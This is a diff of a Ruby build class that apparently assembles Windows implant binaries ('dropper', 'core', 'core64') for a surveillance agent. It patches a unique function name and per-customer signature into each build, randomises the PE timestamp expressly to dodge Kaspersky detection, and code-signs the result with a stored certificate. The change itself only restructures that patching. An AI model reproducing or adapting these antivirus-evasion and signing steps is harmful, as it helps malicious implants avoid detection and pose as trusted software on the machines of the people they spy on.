@@ -35,58 +35,61 @@ class BuildWindows < Build
     # invoke the generic patch method with the new params
     super
 
-    # signature for the patched code
-    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
-
     # calculate the function name for the dropper
     @funcname = 'F' + Digest::MD5.digest(@factory.logkey).unpack('H*').first[0..4]
 
-    file = File.open(path('core'), 'rb+')
-    content = file.read
-
-    begin
-      content.binary_patch 'PFTBBP', @funcname
-    rescue
-      raise "Funcname marker not found"
+    # patching for the function name
+    patch_file(:file => path('core')) do |content|
+      begin
+        content.binary_patch 'PFTBBP', @funcname
+      rescue
+        raise "Funcname marker not found"
+      ensure
+        content
+      end
     end
 
-    # avoid signature on the build time (kaspersky)
-    begin
-      offset = content.index("PE\x00\x00")
-      raise "offset is nil" if offset.nil?
-      content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
-    rescue Exception => e
-      raise "Build time ident marker not found: #{e.message}"
+    # patching the build time (for kaspersky)
+    patch_file(:file => path('core')) do |content|
+      begin
+        offset = content.index("PE\x00\x00")
+        raise "offset is nil" if offset.nil?
+        content.binary_patch_at_offset offset + 8, SecureRandom.random_bytes(4)
+      rescue Exception => e
+        raise "Build time ident marker not found: #{e.message}"
+      ensure
+        content
+      end
     end
-
-    file.rewind
-    file.write content
-    file.close
 
     # we have an exception here, the core64 must be patched only with the signature and function name
-    file = File.open(path('core64'), 'rb+')
-    content = file.read
+
+    # patching for the function name
+    patch_file(:file => path('core64')) do |content|
+      begin
+        content.binary_patch 'PFTBBP', @funcname
+      rescue
+        raise "Funcname marker not found"
+      ensure
+        content
+      end
+    end
 
     # per-customer signature
-    begin
-      sign = ::Signature.where({scope: 'agent'}).first
-      signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
-      content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
-    rescue
-      raise "Signature marker not found"
+    patch_file(:file => path('core64')) do |content|
+      begin
+        sign = ::Signature.where({scope: 'agent'}).first
+        signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
+        content.binary_patch 'f7Hk0f5usd04apdvqw13F5ed25soV5eD', signature
+      rescue
+        raise "Signature marker not found"
+      ensure
+        content
+      end
     end
-
-    begin
-      content.binary_patch 'PFTBBP', @funcname
-    rescue
-      raise "Funcname marker not found"
-    end
-
-    file.rewind
-    file.write content
-    file.close
 
     # signature for the patched code
+    CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core')}" if to_be_signed?(params)
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} #{path('core64')}" if to_be_signed?(params)
 
     # add random bytes to codec, rapi and sqlite
